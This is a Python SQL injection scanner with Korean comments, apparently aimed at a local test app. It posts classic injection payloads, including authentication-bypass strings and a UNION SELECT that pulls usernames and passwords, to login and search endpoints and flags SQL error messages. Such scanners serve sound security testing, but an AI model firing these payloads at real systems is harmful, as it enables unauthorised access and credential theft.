import requests
from datetime import datetime
import re

class SQLInjectionScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.vulnerabilities = []
        
        # SQL Injection 테스트 페이로드
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT username, password FROM users--",
            "1' AND '1'='2",
        ]
        
        # SQL 에러 패턴
        self.error_patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"SQLite",
            r"sqlite3.OperationalError",
            r"unexpected end of SQL command",
            r"Warning: mysql",
            r"valid MySQL result",
            r"MySqlClient",
        ]
    
    def test_login_form(self):
        """로그인 폼 SQL Injection 테스트"""
        print("\n[*] Testing Login Form for SQL Injection...")
        
        for payload in self.payloads:
            data = {
                'username': payload,
                'password': 'test'
            }
            
            try:
                response = requests.post(
                    f"{self.base_url}/login",
                    data=data,
                    allow_redirects=False
                )
                
                # 로그인 성공 여부 확인 (리다이렉트 또는 세션)
                if response.status_code == 302 or 'dashboard' in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'location': '/login',
                        'payload': payload,
                        'severity': 'HIGH',
                        'description': f"SQL Injection in login form with payload: {payload}"
                    })
                    print(f"  [!] VULNERABLE: {payload}")
                
                # SQL 에러 메시지 확인
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection (Error-based)',
                            'location': '/login',
                            'payload': payload,
                            'severity': 'HIGH',
                            'description': f"SQL error message detected: {pattern}"
                        })
                        print(f"  [!] SQL ERROR FOUND: {pattern}")
                        break
                        
            except Exception as e:
                print(f"  [-] Error testing payload {payload}: {str(e)}")
    
    def test_search_function(self):
        """검색 기능 SQL Injection 테스트"""
        print("\n[*] Testing Search Function for SQL Injection...")
        
        for payload in self.payloads:
            try:
                response = requests.get(
                    f"{self.base_url}/search",
                    params={'q': payload}
                )
                
                # SQL 에러 메시지 확인
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection (Error-based)',
                            'location': '/search',
                            'payload': payload,
                            'severity': 'HIGH',
                            'description': f"SQL error in search with payload: {payload}"
                        })
                        print(f"  [!] VULNERABLE: {payload}")
                        break
                
                # UNION 기반 공격 성공 여부
                if 'UNION' in payload and len(response.text) > 1000:
                    self.vulnerabilities.append({
                        'type': 'SQL Injection (UNION-based)',
                        'location': '/search',
                        'payload': payload,
                        'severity': 'CRITICAL',
                        'description': f"UNION-based SQL Injection possible"
                    })
                    print(f"  [!] UNION INJECTION POSSIBLE: {payload}")
                    
            except Exception as e:
                print(f"  [-] Error testing payload {payload}: {str(e)}")
    
    def generate_report(self):
        """리포트 생성"""
        report = "\n" + "="*60 + "\n"
        report += "SQL INJECTION SCAN REPORT\n"
        report += "="*60 + "\n"
        report += f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Target: {self.base_url}\n"
        report += f"Total Vulnerabilities Found: {len(self.vulnerabilities)}\n"
        report += "="*60 + "\n\n"
        
        if self.vulnerabilities:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                report += f"{i}. [{vuln['severity']}] {vuln['type']}\n"
                report += f"   Location: {vuln['location']}\n"
                report += f"   Payload: {vuln['payload']}\n"
                report += f"   Description: {vuln['description']}\n\n"
        else:
            report += "No SQL Injection vulnerabilities found.\n"
        
        return report
    
    def scan(self):
        """전체 스캔 실행"""
        print(f"\n[*] Starting SQL Injection Scan on {self.base_url}")
        print("="*60)
        
        self.test_login_form()
        self.test_search_function()
        
        report = self.generate_report()
        print(report)
        
        # 리포트 파일 저장
        with open('../reports/sql_injection_report.txt', 'w', encoding='utf-8') as f:
            f.write(report)
        
        print(f"[+] Report saved to: ../reports/sql_injection_report.txt")
        
        return self.vulnerabilities

if __name__ == '__main__':
    scanner = SQLInjectionScanner('http://localhost:5000')
    scanner.scan()
